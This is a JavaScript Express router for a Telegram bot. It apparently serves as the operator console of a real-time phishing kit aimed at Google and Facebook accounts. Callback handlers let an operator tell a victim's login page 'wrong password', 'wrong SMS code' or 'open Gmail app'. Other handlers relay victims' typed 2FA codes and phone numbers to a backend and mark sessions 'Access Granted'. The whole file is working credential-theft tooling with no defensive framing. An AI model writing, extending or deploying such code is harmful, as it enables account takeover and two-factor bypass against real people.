import express from "express";
import axios from "axios";
import {
  GMAIL_COMMANDS,
  getCommandUserId,
  isCommandMatch,
  buildFacebookKeyboard,
  buildGoogleKeyboard,
} from "../utils/gmailTelegramCommands.js";
import { getUserMessageManager } from "../utils/userMessageManager.js";

const router = express.Router();

const pendingAuthSessions = new Map();

router.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    console.log('[TELEGRAM WEBHOOK] Received update:', JSON.stringify(update, null, 2));

    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const chatId = update.callback_query.message.chat.id;
      const manager = getUserMessageManager();

      console.log('[TELEGRAM] Callback data:', callbackData);

      // APPAUTH approve
      if (callbackData.startsWith('/appauth ')) {
        const userId = callbackData.split(' ')[1];
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          const response = await axios.post(`${backendUrl}/api/appauth/approve`, { userId }, { timeout: 10000 });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "User approved!"
          });

          if (response.data.success) {
            await manager.update(userId, { currentStep: "Approved - Access Granted", code: null, replyInstruction: null });
          }
        } catch (error) {
          console.error('[TELEGRAM] Error approving user:', error.message);
          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Error occurred"
          });
        }
        return res.status(200).json({ success: true });
      }

      // Google flow switch — ask admin to reply with email
      else if (callbackData.startsWith('/google ')) {
        const userId = callbackData.split(' ')[1];
        try {
          manager.setFlow(userId, 'google');
          await manager.update(userId, {
            currentStep: 'Switched to Google Flow',
            replyInstruction: 'Reply to this message with an email',
            lastReplyType: 'google-email',
            code: null,
          });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Reply with the email"
          });
        } catch (error) {
          console.error('[TELEGRAM] Error switching to Google flow:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G 2FA Number 2 / Email2fa
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.twoFaNumber) || isCommandMatch(callbackData, GMAIL_COMMANDS.email2fa)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';

          pendingAuthSessions.set(chatId, {
            userId,
            type: GMAIL_COMMANDS.twoFaNumber,
            timestamp: Date.now()
          });

          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.twoFaNumber });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "2FA Number — check chat for prompt"
          });

          await manager.update(userId, { currentStep: 'Clicked G2FA Number', replyInstruction: 'Reply to this message with the number', lastReplyType: GMAIL_COMMANDS.twoFaNumber, code: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling 2FA Number:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Bad Email
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.badEmail)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.badEmail });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Couldn't find Google Account"
          });

          await manager.update(userId, { currentStep: 'Clicked Bad Email', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling Bad Email:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Bad Pass
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.badPass)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.badPass });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Wrong password"
          });

          await manager.update(userId, { currentStep: 'Clicked Bad Pass', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling Bad Pass:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G 2FA Gmail
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.twoFaGmail)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.twoFaGmail });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Open Gmail app"
          });

          await manager.update(userId, { currentStep: 'Clicked G 2FA Gmail', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling 2FA Gmail:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G 2FA Code
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.twoFaCode)) {
        const userId = getCommandUserId(callbackData);
        pendingAuthSessions.set(chatId, { userId, type: GMAIL_COMMANDS.twoFaCode, timestamp: Date.now() });

        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.twoFaCode });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Please type verification code"
          });

          await manager.update(userId, { currentStep: 'Clicked G2FA Code', replyInstruction: 'Reply to this message with the number', lastReplyType: GMAIL_COMMANDS.twoFaCode, code: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling 2FA Code:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G 2FA YouTube
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.twoFaYoutube)) {
        const userId = getCommandUserId(callbackData);
        pendingAuthSessions.set(chatId, { userId, type: GMAIL_COMMANDS.twoFaYoutube, timestamp: Date.now() });

        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.twoFaCode });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Please type verification code (YouTube)"
          });

          await manager.update(userId, { currentStep: 'Clicked G2FA YouTube', replyInstruction: 'Reply to this message with the number', lastReplyType: GMAIL_COMMANDS.twoFaYoutube, code: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling 2FA YouTube:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G 2FA SMS
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.twoFaSms)) {
        const userId = getCommandUserId(callbackData);
        pendingAuthSessions.set(chatId, { userId, type: GMAIL_COMMANDS.twoFaSms, timestamp: Date.now() });

        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.twoFaSms });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Enter code from SMS"
          });

          await manager.update(userId, { currentStep: 'Clicked G 2FA SMS', replyInstruction: 'Reply to this message with the Phone Number', lastReplyType: GMAIL_COMMANDS.twoFaSms, code: null });
        } catch (error) {
          console.error('[TELEGRAM] Error handling 2FA SMS:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Wrong 2FA Number
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.wrongTwoFaNumber)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.wrongTwoFaNumber });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Wrong phone number"
          });

          await manager.update(userId, { currentStep: 'Clicked G Wrong 2FA Number', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Wrong 2FA SMS
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.wrongTwoFaSms)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.wrongTwoFaSms });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Sent: Wrong SMS code"
          });

          await manager.update(userId, { currentStep: 'Clicked G W 2FA SMS', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Done
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.done)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/approve`, { userId });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "User approved!"
          });

          await manager.update(userId, { currentStep: 'Done - Access Granted', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // G Wait
      else if (isCommandMatch(callbackData, GMAIL_COMMANDS.wait)) {
        const userId = getCommandUserId(callbackData);
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/decision`, { userId, decision: GMAIL_COMMANDS.wait });

          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "User is now waiting"
          });

          await manager.update(userId, { currentStep: 'Clicked Wait', code: null, replyInstruction: null });
        } catch (error) {
          console.error('[TELEGRAM] Error:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // Switch to Facebook keyboard
      else if (callbackData.startsWith('/switch-fb ')) {
        const userId = callbackData.split(' ')[1];
        try {
          const messageId = update.callback_query.message.message_id;
          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/editMessageReplyMarkup`, {
            chat_id: update.callback_query.message.chat.id,
            message_id: messageId,
            reply_markup: buildFacebookKeyboard(userId),
          });
          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Switched to Facebook commands",
          });
        } catch (error) {
          console.error('[TELEGRAM] Error switching to FB keyboard:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // Switch to Google keyboard
      else if (callbackData.startsWith('/switch-gm ')) {
        const userId = callbackData.split(' ')[1];
        try {
          const messageId = update.callback_query.message.message_id;
          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/editMessageReplyMarkup`, {
            chat_id: update.callback_query.message.chat.id,
            message_id: messageId,
            reply_markup: buildGoogleKeyboard(userId),
          });
          await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: "Switched to Google commands",
          });
        } catch (error) {
          console.error('[TELEGRAM] Error switching to GM keyboard:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      else {
        console.log('[TELEGRAM] Unknown callback data:', callbackData);
      }
    }

    // Handle text message (admin reply or standalone code)
    if (update.message && update.message.text) {
      const chatId = update.message.chat.id;
      const text = update.message.text.trim();

      // If this is a reply to a bot message, route through /api/appauth/reply
      if (update.message.reply_to_message) {
        const replyToMessageId = update.message.reply_to_message.message_id;
        let replyUserId = null;
        const mgr = getUserMessageManager();
        for (const [uid, u] of mgr.users.entries()) {
          if (u.telegramMessageId && String(u.telegramMessageId) === String(replyToMessageId)) {
            replyUserId = uid;
            break;
          }
        }
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/reply`, {
            replyToMessageId,
            code: text,
            userId: replyUserId,
            replyType: replyUserId ? mgr.getUser(replyUserId).data.lastReplyType : undefined,
          });
          pendingAuthSessions.delete(chatId);
          console.log(`[TELEGRAM] Reply forwarded: "${text}" (reply to ${replyToMessageId})`);
        } catch (error) {
          console.error('[TELEGRAM] Error forwarding reply:', error.message);
        }
        return res.status(200).json({ success: true });
      }

      // Standalone text message (not a reply) — use pendingAuthSessions
      const session = pendingAuthSessions.get(chatId);
      if (session) {
        try {
          const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';
          await axios.post(`${backendUrl}/api/appauth/code`, {
            userId: session.userId,
            code: text,
            type: session.type || GMAIL_COMMANDS.twoFaCode
          });
          pendingAuthSessions.delete(chatId);
          console.log(`[TELEGRAM] Code ${text} sent for user ${session.userId}`);
        } catch (error) {
          console.error('[TELEGRAM] Error sending code:', error.message);
        }
        return res.status(200).json({ success: true });
      }
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram webhook error:", error);
    res.status(200).json({ success: true });
  }
});

router.post("/switch-keyboard", async (req, res) => {
  try {
    const { userId, target, callbackQueryId, chatId, messageId } = req.body;
    if (!userId || !target || !chatId || !messageId) {
      return res.status(400).json({ success: false, message: "Missing required fields" });
    }

    const keyboard = target === "fb" ? buildFacebookKeyboard(userId) : buildGoogleKeyboard(userId);

    await axios.post(`https://api.telegram.org/bot${process.env.BOT}/editMessageReplyMarkup`, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: keyboard,
    });

    if (callbackQueryId) {
      await axios.post(`https://api.telegram.org/bot${process.env.BOT}/answerCallbackQuery`, {
        callback_query_id: callbackQueryId,
        text: target === "fb" ? "Switched to Facebook commands" : "Switched to Google commands",
      }).catch(() => {});
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("[TELEGRAM] Error switching keyboard:", error.message);
    return res.status(200).json({ success: false, message: error.message });
  }
});

router.get("/setup", async (req, res) => {
  try {
    const webhookUrl = req.query.url;
    if (!webhookUrl) {
      return res.status(400).json({ success: false, message: "Webhook URL is required" });
    }

    const response = await axios.post(`https://api.telegram.org/bot${process.env.BOT}/setWebhook`, { url: webhookUrl });
    return res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
});

router.get("/info", async (req, res) => {
  try {
    const response = await axios.get(`https://api.telegram.org/bot${process.env.BOT}/getWebhookInfo`);
    return res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
});

router.get("/debug", async (req, res) => {
  const sessions = Array.from(pendingAuthSessions.entries()).map(([chatId, session]) => ({
    chatId,
    userId: session.userId,
    timestamp: new Date(session.timestamp).toISOString(),
    age: Math.floor((Date.now() - session.timestamp) / 1000) + 's'
  }));

  return res.status(200).json({
    success: true,
    totalSessions: pendingAuthSessions.size,
    sessions,
  });
});

setInterval(() => {
  const now = Date.now();
  for (const [chatId, session] of pendingAuthSessions.entries()) {
    if (now - session.timestamp > 300000) {
      pendingAuthSessions.delete(chatId);
    }
  }
}, 300000);

export default router;
